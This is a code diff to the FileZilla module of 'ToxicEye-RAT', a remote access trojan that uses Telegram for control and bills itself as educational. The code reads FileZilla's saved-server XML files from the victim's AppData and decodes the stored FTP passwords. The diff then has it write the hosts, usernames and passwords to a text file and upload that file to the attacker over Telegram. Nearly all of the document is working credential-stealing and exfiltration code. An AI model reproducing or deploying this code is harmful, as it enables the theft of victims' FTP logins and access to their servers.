@@ -1,28 +1,36 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https://github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.IO;
 using System.Xml;
 using System.Text;
-using System.Collections.Generic;
 
 namespace TelegramRAT
 {
     internal class FileZilla
     {
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string FileZillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
             string SiteManagerPath = FileZillaPath + "sitemanager.xml";
             string RecentServersPath = FileZillaPath + "recentservers.xml";
 
-            // List
-            List<Dictionary<string, string>> fzServers = new List<Dictionary<string, string>>();
+            // Database
+            string filename = "filezilla.txt";
+            string output = "[FILEZILLA SERVERS]\n\n";
 
             // If not installed
             if (!Directory.Exists(FileZillaPath))
             {
                 telegram.sendText("🛠 FileZilla not installed");
-                return fzServers;
+                return;
             }
 
             // Get data from recentserver.xml
@@ -38,14 +46,11 @@ namespace TelegramRAT
                         string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                         string username = node["User"].InnerText;
                         string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
-                        // Add to list
-                        Dictionary<string, string> credentials = new Dictionary<string, string>
-                        {
-                            ["url"] = url,
-                            ["username"] = username,
-                            ["password"] = password
-                        };
-                        fzServers.Add(credentials);
+                        // Add
+                        output += "URL: " + url + "\n"
+                               + "USERNAME: " + username + "\n"
+                               + "PASSWORD: " + password + "\n"
+                               + "\n";
                     }
                 } catch {
                     telegram.sendText("⛔ Failed to read recentserver.xml");
@@ -64,14 +69,11 @@ namespace TelegramRAT
                         string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                         string username = node["User"].InnerText;
                         string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
-                        // Add to list
-                        Dictionary<string, string> credentials = new Dictionary<string, string>
-                        {
-                            ["url"] = url,
-                            ["username"] = username,
-                            ["password"] = password
-                        };
-                        fzServers.Add(credentials);
+                        // Add
+                        output += "URL: " + url + "\n"
+                               + "USERNAME: " + username + "\n"
+                               + "PASSWORD: " + password + "\n"
+                               + "\n";
                     }
                 } catch
                 {
@@ -79,8 +81,9 @@ namespace TelegramRAT
                 }
                 
             }
-
-            return fzServers;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
